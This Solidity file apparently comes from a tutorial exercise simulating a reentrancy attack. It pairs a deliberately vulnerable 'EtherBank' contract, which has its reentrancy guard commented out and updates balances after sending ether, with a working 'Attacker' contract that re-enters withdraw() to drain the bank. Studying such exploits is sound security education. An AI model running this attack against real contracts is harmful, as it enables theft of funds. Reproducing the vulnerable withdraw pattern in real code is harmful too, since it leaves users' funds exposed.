// This excersise simulated a reentrancy attack. I was guided via the Block Explorer Youtube Channel
//For optimal simulation, you must deploy the bank contract 1st, then the attack contract with the bank contract address.
//video link https://youtu.be/3sIwIYfeOD8

// EtherBank contract below: (attack contract is further below)

pragma solidity ^0.8.7;
//SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/utils/Address.sol";
//import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "hardhat/console.sol";

contract EtherBank{ //is ReentrancyGuard {
    using Address for address payable;

    mapping(address=>uint) public balances;
    
    function deposit() external payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw() external{ //nonReentrant{
        require(balances[msg.sender]>0, "Withdrawl amount exceeds available balance.");

        console.log("");
        console.log("EtherBank balance: ", address(this).balance);
        console.log("Attacker balance", balances[msg.sender]);
        console.log("");


        //uint accountBalance = balances[msg.sender];
        //balances[msg.sender]=0;
        payable (msg.sender).sendValue(balances[msg.sender]);
        balances[msg.sender]=0;
        //(accountBalance); //(balances[msg.sender]);
        //balances[msg.sender]=0;
    }
        
    function getBalance() external view returns(uint){
        return address(this).balance;
    }
    
}


// Attacker contract:

pragma solidity ^0.8.7;
//SPDX-License-Identifier: MIT
import "hardhat/console.sol";

interface IEtherBank{
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker{
    IEtherBank public immutable etherBank;
    address private owner;

    constructor(address etherBankAddress){
        etherBank= IEtherBank(etherBankAddress);
        owner= msg.sender;
    }

    function attack() external payable onlyOwner {
        etherBank.deposit{value: msg.value}();
        etherBank.withdraw();
    }

    receive() external payable{
        if(address(etherBank).balance >0){
            console.log("reentering...");
            etherBank.withdraw();
        } else{
            console.log("victim account drained");
            payable(owner).transfer(address(this).balance);
        }
    }

    function getBalance() public view returns(uint){
        return address (this).balance;
    }
    modifier onlyOwner(){
        require(owner==msg.sender, "only owner can attack!");
        _;
    }
}
